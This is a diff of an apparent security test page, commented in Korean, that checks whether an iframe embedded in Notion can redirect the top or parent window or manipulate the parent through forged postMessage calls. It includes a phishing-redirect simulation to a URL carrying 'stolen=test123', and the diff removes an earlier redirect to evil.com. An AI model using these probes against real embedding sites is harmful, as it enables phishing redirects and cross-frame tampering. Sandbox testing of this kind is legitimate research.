@@ -1,22 +1,60 @@
 <html>
-<body>
-<h2>Notion Embed Test</h2>
+<body style="background:#ffe0e0; padding:20px; font-family:sans-serif;">
+<h2>Notion Top-Navigation Test</h2>
 
-<button onclick="window.top.location='https://evil.com'">
+<!-- 테스트 A: top 이동 (사용자 클릭) -->
+<button onclick="try { window.top.location='https://example.com'; } catch(e) { document.getElementById('log').textContent += 'TEST A 차단됨: '+e.message+'\n'; }" style="padding:15px 30px; font-size:18px; background:#e94560; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px;">
+  TEST A: window.top.location 이동
+</button>
+<br><br>
+
+<!-- 테스트 B: parent 이동 -->
+<button onclick="try { window.parent.location='https://example.com'; } catch(e) { document.getElementById('log').textContent += 'TEST B 차단됨: '+e.message+'\n'; }" style="padding:15px 30px; font-size:18px; background:#0f3460; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px;">
+  TEST B: window.parent.location 이동
+</button>
+<br><br>
+
+<!-- 테스트 C: 피싱 시뮬레이션 (가짜 로그인) -->
+<button onclick="try { window.top.location='https://httpbin.org/get?stolen=test123'; } catch(e) { document.getElementById('log').textContent += 'TEST C 차단됨: '+e.message+'\n'; }" style="padding:15px 30px; font-size:18px; background:#4ecca3; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px;">
+  TEST C: 피싱 페이지 리다이렉트 시뮬레이션
+</button>
+<br><br>
+
+<!-- 테스트 D: postMessage로 Notion 조작 시도 -->
+<button onclick="
+  var msgs = [
+    {type:'navigation', url:'https://example.com'},
+    {type:'redirect', location:'https://example.com'},
+    {source:'notion', type:'navigate', url:'https://example.com'},
+    'https://example.com'
+  ];
+  msgs.forEach(function(m,i){
+    try {
+      window.parent.postMessage(m, '*');
+      document.getElementById('log').textContent += 'postMessage '+i+' 전송됨\n';
+    } catch(e) {
+      document.getElementById('log').textContent += 'postMessage '+i+' 실패: '+e.message+'\n';
+    }
+  });
+" style="padding:15px 30px; font-size:18px; background:#f9a825; color:black; border:none; border-radius:8px; cursor:pointer; margin:10px;">
+  TEST D: postMessage로 parent 조작 시도
 </button>
 
 <br><br>
-
-<button onclick="window.open('https://example.com')">
-</button>
+<div style="background:white; padding:15px; border-radius:8px; min-height:100px;">
+  <strong>로그:</strong><br>
+  <pre id="log" style="color:black;"></pre>
+</div>
 
 <script>
-console.log('Embed JS executed on domain: ' + document.domain);
+document.getElementById('log').textContent = 'JS 실행됨. domain: ' + document.domain + '\n';
+document.getElementById('log').textContent += 'window.top === window.self: ' + (window.top === window.self) + '\n';
+document.getElementById('log').textContent += 'window.parent === window.self: ' + (window.parent === window.self) + '\n';
 
-if (window.parent !== window) {
-  window.parent.postMessage({type:'xss-test', data:'hello'}, '*');
-  console.log('postMessage sent to parent');
-}
+// Notion에서 오는 postMessage 감지
+window.addEventListener('message', function(e) {
+  document.getElementById('log').textContent += 'Received postMessage from ' + e.origin + ': ' + JSON.stringify(e.data).substring(0,200) + '\n';
+});
 </script>
 </body>
 </html>
